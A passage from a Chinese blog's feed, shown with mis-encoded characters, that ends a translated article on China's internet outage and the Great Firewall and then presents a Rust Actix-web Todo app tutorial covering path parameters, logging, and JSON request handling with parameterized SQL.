href="https://blog.thousandeyes.com/deconstructing-great-firewall-china/">é•¿åŸé˜²ç«å¢™</a>â€æ˜¯ä¸€å¥—ç»Ÿä¸€ç®¡ç†çš„è§„åˆ™ï¼Œä½¿ä¸­å›½ç”¨æˆ·ä¸å…¨çƒå…¶ä»–åœ°æ–¹éš”ç¦»ã€‚ä»–ä»¬æƒ³è±¡ä¸€æ–¹é¢æ˜¯ä¸­å›½åºå¤§çš„ç”¨æˆ·å’Œä¸ºä»–ä»¬æä¾›æœåŠ¡çš„ç½‘ç»œåŸºç¡€è®¾æ–½ï¼Œå¦ä¸€æ–¹é¢ï¼Œäº’è”ç½‘çš„å…¶ä½™éƒ¨åˆ†ã€‚ä½†ç°å®æƒ…å†µæ˜¯ï¼Œä¸­å›½ä¸å¤–éƒ¨ç½‘ç«™å’ŒæœåŠ¡çš„è”ç³»éå¸¸ç´§å¯†â”€â”€è‡³å°‘æ˜¯é‚£äº›æœåŠ¡äºå•†ä¸šåˆ©ç›Šçš„ç½‘ç«™å’ŒæœåŠ¡ã€‚</p><p>ä¸­å›½äº’è”ç½‘æœåŠ¡æä¾›å•†ï¼ˆISPï¼‰çš„æ ‡å‡†æ“ä½œç¨‹åºå…è®¸è®¿é—®å¤§å¤šæ•°è¥¿æ–¹åŸºäºäº‘çš„ä¸šåŠ¡æœåŠ¡ã€‚é€šè¿‡å…è®¸å›½å†…å’Œå¤–å›½å…¬å¸æ›´æœ‰æ•ˆåœ°å¼€å±•ä¸šåŠ¡ï¼Œä»ä¸­å›½å¢ƒå†…è¿›å…¥è¿™äº›ç±»å‹çš„ç½‘ç«™ç¬¦åˆä¸­å›½çš„åˆ©ç›Šã€‚é€šä¿—åœ°è¯´ï¼Œæ‚¨å¯ä»¥ä»ä¸­å›½å¢ƒå†…è®¿é—®è®¸å¤šç¾å›½æœåŠ¡ã€‚</p><p>å…¶æ¬¡ï¼Œå¤§å¤šæ•°äººä¹Ÿå¯èƒ½æ²¡æœ‰æ„è¯†åˆ°ä¸­å›½çš„äº’è”ç½‘æœåŠ¡æä¾›å•†å°†æ‹¥æœ‰å…¨çƒæ€§çš„å­˜åœ¨ã€‚ä½†æ˜¯ï¼Œå¦‚ä¸Šå›¾2æ‰€ç¤ºï¼Œä¸­å›½ç”µä¿¡æ§åˆ¶å’Œç®¡ç†çš„åŸºç¡€è®¾æ–½èŒƒå›´è¿œè¿œè¶…å‡ºäº†ä¸­å›½çš„åœ°ç†è¾¹ç•Œã€‚è¯¥æä¾›å•†è¿˜ç»´æŠ¤å…¨çƒäº’è”ï¼Œä¸å…¨çƒè®¸å¤šåœ°æ–¹çš„æœåŠ¡æä¾›å•†ä¿æŒè”ç³»ã€‚</p><p>é‚£äº›å›å¿†èµ·<a href="https://blog.thousandeyes.com/internet-vulnerability-takes-down-google/">å»å¹´å½±å“è°·æ­ŒæœåŠ¡çš„BGPè·¯ç”±æ³„æ¼</a>çš„è¯»è€…ï¼Œå¯èƒ½è¿˜è®°å¾—ä¸­å›½ç”µä¿¡åœ¨é‚£ä¸€é›†ä¸­çš„å®¢ä¸²ã€‚ä¸­å›½ç”µä¿¡ä¸è´Ÿè´£å°¼æ—¥åˆ©äºšå·¥å‚è·¯çº¿æ³„æ¼çš„ISPï¼ˆMainOneï¼‰ä¿æŒè”ç³»ã€‚ä¸­å›½ç”µä¿¡æœªèƒ½è¿‡æ»¤é€šå¾€è°·æ­Œçš„å¹¿å‘Šè·¯çº¿ï¼ˆè€Œæ˜¯å°†å…¶ä¼ æ’­ç»™å…¶ä»–åŒè¡Œï¼‰ï¼Œå¯¼è‡´ä¸€äº›ç”¨æˆ·è¯•å›¾è®¿é—®è°·æ­Œçš„æœåŠ¡ä¸­æ–­ã€‚</p><h2><span id="hu-lian-wang-wu-chu-bu-zai">äº’è”ç½‘æ— å¤„ä¸åœ¨</span></h2><p>æ— è®ºäº’è”ç½‘åœ¨å“ªé‡Œï¼Œæ— è®ºæ˜¯åœ¨ä¸€ä¸ªè‡ªç”±çš„æ°‘ä¸»å›½å®¶ï¼Œè¿˜æ˜¯åœ¨é«˜åº¦å›½å®¶æ§åˆ¶çš„ç¯å¢ƒä¸­ï¼Œå®ƒéƒ½æ˜¯æ ¹æœ¬æ— æ³•é¢„æµ‹çš„ã€‚è¿™æ˜¯ç”±äºå®ƒè¢«æ„å»ºä¸ºè‡ªæ„¿äº’è¿ä½†å•ç‹¬ç®¡ç†çš„ç½‘ç»œï¼ŒåŸºç¡€æŠ€æœ¯çš„è‡ªåŠ¨åŒ–æ€§è´¨ï¼ˆä¾‹å¦‚BGPè·¯ç”±ï¼‰ä»¥åŠå®Œå…¨ç¼ºä¹é›†ä¸­å¼è¿è¥ç®¡ç†çš„çš„é›†åˆã€‚</p><p>å½“äº’è”ç½‘çš„æŸä¸ªéƒ¨åˆ†å‡ºç°ç³Ÿç³•çš„äº‹æƒ…æ—¶ï¼Œå°¤å…¶æ˜¯åœ¨åƒä¸­å›½è¿™æ ·çš„åç»­å›½å®¶ï¼Œäº’è”ç½‘çš„å…¶ä»–éƒ¨åˆ†ä¼šäº§ç”Ÿè¿é”ååº”ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¶…è¿‡ä¸€ç™¾ç§å•†ä¸šæœåŠ¡å—åˆ°å½±å“ï¼Œæ¯«æ— ç–‘é—®ï¼Œå› æ­¤äº§ç”Ÿäº†ç”Ÿäº§åŠ›å’Œæ”¶å…¥æŸå¤±ã€‚</p><p>å½“ä½ è€ƒè™‘äº’è”ç½‘æ˜¯å¤šä¹ˆä¸å¯é¢„æµ‹çš„æ—¶å€™ï¼Œä»Šå¤©çš„ä¼ä¸šä¾èµ–äº’è”ç½‘çš„ç¨‹åº¦ç›¸å½“æƒŠäººã€‚è¿™æ˜¯æœ€ç»ˆçš„ä¸å—æ§åˆ¶çš„ç¯å¢ƒã€‚è¿™å°±å¼•å‡ºäº†ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœä½ æ— æ³•ç›´æ¥æ§åˆ¶å®ƒï¼Œä½ æ˜¯å¦æ‹¥æœ‰å°½å¯èƒ½æœ€å¥½åœ°ç®¡ç†å®ƒçš„å¯è§æ€§ï¼Ÿ</p><h2><span id="xian-zai-guan-yu-na-ge-cai-ce">ç°åœ¨å…³äºé‚£ä¸ªçŒœæµ‹</span></h2><p>å› ä¸ºThousandEyesæœ¬è´¨ä¸Šæ˜¯ï¼ˆä¸æ–­å˜åŒ–çš„ï¼‰äº’è”ç½‘çš„å®æ—¶åœ°å›¾ï¼Œæˆ‘ä»¬èƒ½å¤Ÿè·Ÿè¸ªäº’è”ç½‘ä¸­æ–­åŠå…¶å…¨çƒå½±å“ï¼Œæ— è®ºæ˜¯åœ¨ä¸­å›½ï¼Œ<a href="https://blog.thousandeyes.com/yandex-packet-loss-ddos-or-russian-firewall/">ä¿„ç½—æ–¯</a>è¿˜æ˜¯å…¶ä»–åœ°æ–¹ï¼Œä½†æˆ‘ä»¬ä¸èƒ½ä¹Ÿä¸ä¼šæ¨æµ‹è¿™ç§ç½‘ç»œäº‹ä»¶çš„åœ°ç¼˜æ”¿æ²»å’Œå¯èƒ½çš„åŠ¨æœºï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚</p><p>ç„¶è€Œï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸­å›½çš„äº’è”ç½‘æœåŠ¡æä¾›å•†éå¸¸ç²¾é€šå¯¹è¿›å‡ºç½‘ç»œçš„æµé‡å®æ–½ç»†ç²’åº¦æ§åˆ¶ã€‚å¦‚æœæœ‰æ„å±•ç¤ºç¦ç”¨ç¾å›½åº”ç”¨ç¨‹åºå’ŒæœåŠ¡çš„èƒ½åŠ›ï¼Œé‚£ä¹ˆä»æŠ€æœ¯è§’åº¦æ¥çœ‹ï¼Œå®ƒè‚¯å®šæ²¡æœ‰å¾—åˆ°å¾ˆæ˜ç¡®çš„ä½“ç°ã€‚æ¯•ç«Ÿï¼Œè¢«ç ´åçš„ç½‘ç«™å’ŒæœåŠ¡æ˜¯ä¸åˆ†é’çº¢çš‚ç™½çš„ï¼Œå½±å“åˆ°ä¸­å›½å¢ƒå†…å¤–çš„äººã€‚</p><h2><span id="li-ji-huo-de-ke-jian-xing">ç«‹å³è·å¾—å¯è§æ€§</span></h2><p>ä¸»è¦çš„äº’è”ç½‘ä¸­æ–­æ˜¯ä¼ä¸šå›¢é˜Ÿå…³æ³¨ä¼ä¸šæ‰€ä¾èµ–çš„å¤§é‡å¤–éƒ¨ä¾èµ–å…³ç³»çš„è­¦é’Ÿã€‚å¦‚æœä½ æ— æ³•æ·±å…¥äº†è§£å››é¢å¢™ä»¥å¤–çš„åº”ç”¨å’Œç½‘ç»œå±‚æ¡ä»¶ï¼Œé‚£ä¹ˆå½“ä½ çš„äº‘å’Œäº’è”ç½‘ç”Ÿæ€ç³»ç»Ÿå‘ç”Ÿä¸å¯é¢„æµ‹çš„äº‹æƒ…æ—¶ï¼Œæ‚¨å°†é™·å…¥å›°å¢ƒã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ç½‘ç»œæ•…éšœé€éœ²ä¸­å›½äº’è”ç½‘æ¥å…¥ç°çŠ¶
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="GFW" scheme="https://qiwihui.com/tags/GFW/"/>
    
  </entry>
  
  <entry>
    <title>ç”¨ Rust Actix-web å†™ä¸€ä¸ª Todo åº”ç”¨ï¼ˆäºŒï¼‰â”€â”€ è¯·æ±‚è·å–å’Œæ—¥å¿—è®°å½•</title>
    <link href="https://qiwihui.com/qiwihui-blog-106/"/>
    <id>https://qiwihui.com/qiwihui-blog-106/</id>
    <published>2022-08-13T01:54:25.620Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="ru-he-huo-qu-lu-jing-can-shu">å¦‚ä½•è·å–è·¯å¾„å‚æ•°</span></h2><p>æ·»åŠ æ ¹æ® id è·å–æ•°æ®æ“ä½œï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io::&#123;Error, ErrorKind&#125;;</span><br><span class="line"><span class="comment">// ...çœç•¥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">get_todo</span>(client: &amp;Client, list_id: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;TodoList, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">statement</span> = client</span><br><span class="line">        .<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from todo_list where id = $1&quot;</span>)</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">may_todo</span> = client</span><br><span class="line">        .<span class="title function_ invoke__">query_opt</span>(&amp;statement, &amp;[&amp;list_id])</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error getting todo lists&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|row| TodoList::<span class="title function_ invoke__">from_row_ref</span>(&amp;row).<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> may_todo &#123;</span><br><span class="line">        <span class="title function_ invoke__">Some</span>(todo) =&gt; <span class="title function_ invoke__">Ok</span>(todo),</span><br><span class="line">        <span class="literal">None</span> =&gt; <span class="title function_ invoke__">Err</span>(Error::<span class="title function_ invoke__">new</span>(ErrorKind::NotFound, <span class="string">&quot;Not found&quot;</span>)),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¾ç½®è¯·æ±‚å‚æ•°ï¼Œè®¾ç½®ä½¿ç”¨ <code>Info</code> ä½œä¸ºè¯·æ±‚è·¯å¾„å‚æ•°åºåˆ—åŒ–ç»“æ„ä½“ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::db::&#123;get_todo, get_todos&#125;;</span><br><span class="line"><span class="keyword">use</span> serde::Deserialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...çœç•¥</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Deserialize)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> list_id: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">todo</span>(info: web::Path&lt;Info&gt;, db_pool: web::Data&lt;Pool&gt;) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">client</span>: Client = db_pool</span><br><span class="line">        .<span class="title function_ invoke__">get</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error connecting to the database&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">result</span> = <span class="title function_ invoke__">get_todo</span>(&amp;client, info.list_id).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">match</span> result &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(todo) =&gt; HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">json</span>(todo),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(_) =&gt; HttpResponse::<span class="title function_ invoke__">InternalServerError</span>().<span class="title function_ invoke__">into</span>(),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ·»åŠ è·¯ç”±ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> handlers::&#123;todo, todos&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...çœç•¥</span></span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(<span class="keyword">move</span> || &#123;</span><br><span class="line">        App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">            .<span class="title function_ invoke__">data</span>(pool.<span class="title function_ invoke__">clone</span>())</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(hello)</span><br><span class="line">            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(todos))</span><br><span class="line">            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(todo))</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œå¹¶è·å–ç»“æœï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:8000/todos/1</span></span><br><span class="line">&#123;&quot;id&quot;:1,&quot;title&quot;:&quot;List 1&quot;&#125;</span><br></pre></td></tr></table></figure><h2><span id="zeng-jia-ri-zhi-ji-lu">å¢åŠ æ—¥å¿—è®°å½•</span></h2><p>ä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹æ“ä½œè¿‡ç¨‹ï¼Œå¯ä»¥å¢åŠ æ—¥å¿—è®°å½•ï¼Œä½¿ç”¨ <code>env_logger</code> æ–¹ä¾¿ä»ç¯å¢ƒå˜é‡ä¸­è®¾ç½®æ—¥å¿—è®°å½•çº§åˆ«ï¼Œ<code>log</code> ç”¨äºè®°å½•ä¸åŒçº§åˆ«æ—¥å¿—ï¼Œæ¯”å¦‚ <code>info</code>ï¼Œ<code>debug</code>ã€‚</p><p><code>Cargo.toml</code>ï¼š</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="attr">env_logger</span> = <span class="string">&quot;0.8&quot;</span></span><br><span class="line"><span class="attr">log</span>=<span class="string">&quot;0.4&quot;</span></span><br></pre></td></tr></table></figure><p>åœ¨ <code>.env</code> ä¸­å¯ä»¥æ‰‹åŠ¨è®¾ç½®æ—¥å¿—è®°å½•çº§åˆ«ï¼Œæ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUST_LOG=info</span><br></pre></td></tr></table></figure><p><code>main.rs</code>ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_web::&#123;get, middleware, web, App, HttpServer, Responder&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> env_logger;</span><br><span class="line"><span class="keyword">use</span> log::info;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">     <span class="title function_ invoke__">dotenv</span>().<span class="title function_ invoke__">ok</span>();</span><br><span class="line">+    <span class="keyword">if</span> std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;RUST_LOG&quot;</span>).<span class="title function_ invoke__">is_err</span>() &#123;</span><br><span class="line">+        std::env::<span class="title function_ invoke__">set_var</span>(<span class="string">&quot;RUST_LOG&quot;</span>, <span class="string">&quot;actix_web=info&quot;</span>);</span><br><span class="line">+    &#125;</span><br><span class="line">+    env_logger::<span class="title function_ invoke__">init</span>();</span><br><span class="line">     <span class="keyword">let</span> <span class="variable">cfg</span> = crate::config::Config::<span class="title function_ invoke__">from_env</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">     <span class="keyword">let</span> <span class="variable">pool</span> = cfg.pg.<span class="title function_ invoke__">create_pool</span>(NoTls).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">+    info!(</span><br><span class="line">         <span class="string">&quot;Starting server at http://&#123;&#125;:&#123;&#125;&quot;</span>,</span><br><span class="line">         cfg.server.host, cfg.server.port</span><br><span class="line">     );</span><br><span class="line">     HttpServer::<span class="title function_ invoke__">new</span>(<span class="keyword">move</span> || &#123;</span><br><span class="line">         App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">             .<span class="title function_ invoke__">data</span>(pool.<span class="title function_ invoke__">clone</span>())</span><br><span class="line">+            .<span class="title function_ invoke__">wrap</span>(middleware::Logger::<span class="title function_ invoke__">default</span>())</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œä»¥æŸ¥çœ‹æ—¥å¿—</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cargo run</span></span><br><span class="line">   Compiling todo-list v0.1.0 (/Users/qiwihui/rust/todo-list)</span><br><span class="line">    Finished dev [unoptimized + debuginfo] target(s) in 1m 19s</span><br><span class="line">     Running `target/debug/todo-list`</span><br><span class="line">[2020-10-23T06:43:18Z INFO  todo_list] Starting server at http://127.0.0.1:8000</span><br><span class="line">[2020-10-23T06:43:18Z INFO  actix_server::builder] Starting 4 workers</span><br><span class="line">[2020-10-23T06:43:18Z INFO  actix_server::builder] Starting &quot;actix-web-service-127.0.0.1:8000&quot; service on 127.0.0.1:8000</span><br><span class="line">[2020-10-23T06:45:04Z INFO  actix_web::middleware::logger] 127.0.0.1:63751 &quot;GET /todos HTTP/1.1&quot; 200 79 &quot;&quot; &quot;curl/7.64.1&quot; 0.016465</span><br></pre></td></tr></table></figure><h2><span id="ru-he-huo-qu-qing-qiu-ti">å¦‚ä½•è·å–è¯·æ±‚ä½“</span></h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¢åŠ æ’å…¥æ•°æ®æ“ä½œï¼Œsql è¯­å¥ä¸­çš„ <code>returning id, title</code> ç”¨äºè¿”å›æ’å…¥æˆåŠŸçš„æ•°æ®</p><p><code>db.rs</code>ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">create_todo</span>(client: &amp;Client, title: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;TodoList, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">statement</span> = client</span><br><span class="line">        .<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;insert into todo_list (title) values ($1) returning id, title&quot;</span>)</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">    client</span><br><span class="line">        .<span class="title function_ invoke__">query</span>(&amp;statement, &amp;[&amp;title])</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error creating todo list&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">iter</span>()</span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|row| TodoList::<span class="title function_ invoke__">from_row_ref</span>(row).<span class="title function_ invoke__">unwrap</span>())</span><br><span class="line">        .collect::&lt;<span class="type">Vec</span>&lt;TodoList&gt;&gt;()</span><br><span class="line">        .<span class="title function_ invoke__">pop</span>()</span><br><span class="line">        .<span class="title function_ invoke__">ok_or</span>(Error::<span class="title function_ invoke__">new</span>(ErrorKind::Other, <span class="string">&quot;Error creating todo list&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¢åŠ è¯·æ±‚å¤„ç†ï¼Œ<code>CreateTodoList</code> ç”¨äºåºåˆ—åŒ–è¯·æ±‚çš„æ•°æ®ï¼š</p><p><code>handles.rs</code></p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#[derive(Deserialize)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">CreateTodoList</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> title: <span class="type">String</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">create_todo</span>(</span><br><span class="line">    info: web::Json&lt;CreateTodoList&gt;,</span><br><span class="line">    state: web::Data&lt;AppState&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">client</span>: Client = state</span><br><span class="line">        .pool</span><br><span class="line">        .<span class="title function_ invoke__">get</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error connecting to the database&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">result</span> = db::<span class="title function_ invoke__">create_todo</span>(&amp;client, info.<span class="number">0</span>.title.<span class="title function_ invoke__">clone</span>()).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">match</span> result &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(todo) =&gt; HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">json</span>(todo),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(_) =&gt; HttpResponse::<span class="title function_ invoke__">InternalServerError</span>().<span class="title function_ invoke__">into</span>(),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>state: web::Data&lt;AppState&gt;</code> å°† åŸæ¥çš„ pool åšäº†ç®€å•çš„å°è£…ï¼Œå¥½å¤„åœ¨äºå¯ä»¥ä¼ å…¥å¤šä¸ªæ•°æ®ä½œä¸º <code>web::Data</code>ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// .. çœç•¥</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">AppState</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> pool: Pool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="comment">// .. çœç•¥</span></span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(<span class="keyword">move</span> || &#123;</span><br><span class="line">        App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">            .<span class="title function_ invoke__">data</span>(AppState &#123; pool: pool.<span class="title function_ invoke__">clone</span>() &#125;)</span><br></pre></td></tr></table></figure><p>åŒæ—¶æ·»åŠ è·¯ç”±ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">  <span class="comment">// çœç•¥</span></span><br><span class="line">  .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">post</span>().<span class="title function_ invoke__">to</span>(handlers::create_todo))</span><br></pre></td></tr></table></figure><p>å®Œæˆåè¿è¡Œ <code>cargo run</code>ï¼Œåœ¨ä½¿ç”¨ curl è¿›è¡Œè¯·æ±‚æ—¶ï¼Œæ³¨æ„æ·»åŠ  <code>-H &quot;Content-Type: application/json&quot;</code> å¤´éƒ¨ä¿¡æ¯ï¼Œå¦åˆ™æ— æ³•å¤„ç†ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -X POST 127.0.0.1:8000/todos -d <span class="string">&#x27;&#123;&quot;title&quot;: &quot;list 3&quot;&#125;&#x27;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span></span></span><br><span class="line">&#123;&quot;id&quot;:3,&quot;title&quot;:&quot;list 3&quot;&#125;</span><br></pre></td></tr></table></figure><h2><span id="qi-ta-cao-zuo">å…¶ä»–æ“ä½œ</span></h2><p>ç»§ç»­æ·»åŠ å…¶ä»–æ“ä½œï¼Œå¦‚è·å–åˆ›å»ºå•ä¸ªé¡¹ï¼Œä»¥åŠå®Œæˆé¡¹ç›®ï¼ˆ<code>check_todo</code>ï¼‰</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">get_items</span>(client: &amp;Client, list_id: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;TodoItem&gt;, Error&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">get_item</span>(client: &amp;Client, list_id: <span class="type">i32</span>, item_id: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;TodoItem, Error&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">create_item</span>(client: &amp;Client, list_id: <span class="type">i32</span>, title: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;TodoItem, Error&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">check_todo</span>(client: &amp;Client, list_id: <span class="type">i32</span>, item_id: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">bool</span>, Error&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥åŠå¯¹åº”çš„è·¯ç”±å’Œè¯·æ±‚å¤„ç†ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;/items&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::items))</span><br><span class="line">.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;/items&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">post</span>().<span class="title function_ invoke__">to</span>(handlers::create_item))</span><br><span class="line">.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;/items/&#123;item_id&#125;&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::get_item))</span><br><span class="line">.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;/items/&#123;item_id&#125;&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">put</span>().<span class="title function_ 